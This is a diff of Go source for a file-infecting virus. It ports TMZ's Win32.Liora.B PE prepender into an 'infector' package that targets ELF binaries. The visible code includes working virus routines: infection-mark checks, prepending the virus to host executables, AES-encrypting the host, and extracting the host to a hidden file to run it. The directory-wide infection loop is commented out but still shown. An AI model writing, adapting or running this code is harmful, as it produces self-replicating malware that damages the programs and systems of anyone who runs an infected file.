@@ -1,31 +1,9 @@
-/*
-* Win32.Liora.B - This is a POC PE prepender written in Go by TMZ (2015).
-*
-* Win32.Liora.B (May 2015) - Simple binary infector in GoLang (prepender).
-* This version encrypts the host code with AES and decrypts it at runtime.
-* It's almost a direct port from my GoLang ELF infector Linux.Liora, just a few tweaks.
-*
-* Compile with: go build -i liora.go (where go >= 1.4.2)
-* It has no external dependencies so it should compile under most systems (x86 and x86_64).
-*
-* Use at your own risk, I'm not responsible for any damages that this may cause.
-*
-* A shout for those who keeps the scene alive: herm1t, alcopaul, hh86, SPTH, genetix, R3s1stanc3 & others
-*
-* Feel free to email me: tmz@null.net || You can also find me at http://vxheaven.org/ and on Twitter @TMZvx
-*
-* http://vx.thomazi.me
- */
-
-package main
+package infector
 
 import (
 	"bufio"
 	"crypto/aes"
 	"crypto/cipher"
-	"debug/pe"
-	"encoding/binary"
-	"io"
 	"io/ioutil"
 	"math/rand"
 	"os"
@@ -42,42 +20,25 @@ func check(e error) {
 	}
 }
 
-func _ioReader(file string) io.ReaderAt {
-	r, err := os.Open(file)
+func CheckELF(file string) bool {
+
+	f, err := os.Open(file)
 	check(err)
-	return r
-}
-
-func CheckPE(file string) bool {
-
-	r := _ioReader(file)    //reader interface for file
-	f, err := pe.NewFile(r) //open the file as a PE
-	if err != nil {
-		return false //Not a PE file
-	}
-
-	//Reading DOS header
-	var dosheader [96]byte
-	r.ReadAt(dosheader[0:], 0)
-	if dosheader[0] == 'M' && dosheader[1] == 'Z' { //if we get MZ
-		signoff := int64(binary.LittleEndian.Uint32(dosheader[0x3c:]))
-		var sign [4]byte
-		r.ReadAt(sign[:], signoff)
-		if !(sign[0] == 'P' && sign[1] == 'E' && sign[2] == 0 && sign[3] == 0) { //if not PE\0\0
-			return false //Invalid PE File Format
-		}
-	}
-	if (f.Characteristics & 0x2000) == 0x2000 { //IMAGE_FILE_DLL signature
-		return false //it's a DLL, OCX, CPL file, we want a EXE file
-	}
-
+	bytes := make([]byte, 4) //read the magic number
+	f.Read(bytes)
 	f.Close()
-	return true //it is a valid EXE file
+
+	//check if is an ELF
+	if strings.Contains(string(bytes), "ELF") {
+		return true
+	} else {
+		return false
+	}
 
 }
 
 func CheckInfected(file string) bool {
-	//a method by genetix, very handy
+
 	_mark := "=TMZ=" //infection mark
 	fi, err := os.Open(file)
 	check(err)
@@ -106,6 +67,7 @@ func CheckInfected(file string) bool {
 		}
 	}
 	return false //not infected
+
 }
 
 func Infect(file string) {
@@ -114,7 +76,7 @@ func Infect(file string) {
 	check(err)
 	vir, err := os.Open(os.Args[0]) //read virus
 	check(err)
-	virbuf := make([]byte, 3039232)
+	virbuf := make([]byte, 1666208)
 	vir.Read(virbuf)
 
 	encDat := Encrypt(dat) //encrypt host
@@ -128,12 +90,11 @@ func Infect(file string) {
 	w.Flush()       //make sure we are all set
 	f.Close()
 	vir.Close()
-
 }
 
 func RunHost() {
 
-	hostbytes := Rnd(8) + ".exe" //generate random name
+	hostbytes := "." + Rnd(8) //generate hidden random name
 
 	h, err := os.Create(hostbytes) //create tmp with above name
 	check(err)
@@ -141,12 +102,12 @@ func RunHost() {
 	infected_data, err := ioutil.ReadFile(os.Args[0]) //Read myself
 	check(err)
 	allSZ := len(infected_data) //get file full size
-	hostSZ := allSZ - 3039232   //calculate host size
+	hostSZ := allSZ - 1666208   //calculate host size
 
 	f, err := os.Open(os.Args[0]) //open host
 	check(err)
 
-	f.Seek(3039232, os.SEEK_SET) //go to host start
+	f.Seek(1666208, os.SEEK_SET) //go to host start
 
 	hostBuf := make([]byte, hostSZ)
 	f.Read(hostBuf) //read it
@@ -160,10 +121,11 @@ func RunHost() {
 	f.Close()
 
 	os.Chmod(hostbytes, 0755) //give it proper permissions
-	cmd := exec.Command(hostbytes)
-	cmd.Start() //execute it
-	err = cmd.Wait()
+	out, err := exec.Command("./" + hostbytes).Output()
+	check(err)
+	print(string(out))
 	os.Remove(hostbytes)
+
 }
 
 func Encrypt(toEnc []byte) []byte {
@@ -217,7 +179,6 @@ func Rnd(n int) string {
 }
 
 func GetSz(file string) int64 {
-
 	myHnd, err := os.Open(file)
 	check(err)
 	defer myHnd.Close()
@@ -228,24 +189,21 @@ func GetSz(file string) int64 {
 	return mySZ
 }
 
-func main() {
-
-	virPath := os.Args[0]
-
-	files, _ := ioutil.ReadDir(".")
-	for _, f := range files {
-		if CheckPE(f.Name()) == true {
-			if CheckInfected(f.Name()) == false {
-				if !strings.Contains(virPath, f.Name()) {
-					Infect(f.Name())
-				}
-			}
-		}
-	}
-
-	if GetSz(os.Args[0]) > 3039232 {
-		RunHost()
-	} else {
-		os.Exit(0)
-	}
-}
+//func main() {
+//	virPath := os.Args[0]
+//	files, _ := ioutil.ReadDir(".")
+//	for _, f := range files {
+//		if CheckELF(f.Name()) == true {
+//			if CheckInfected(f.Name()) == false {
+//				if !strings.Contains(virPath, f.Name()) {
+//					Infect(f.Name())
+//				}
+//			}
+//		}
+//	}
+//	if GetSz(os.Args[0]) > 1666208 {
+//		RunHost()
+//	} else {
+//		os.Exit(0)
+//	}
+//}
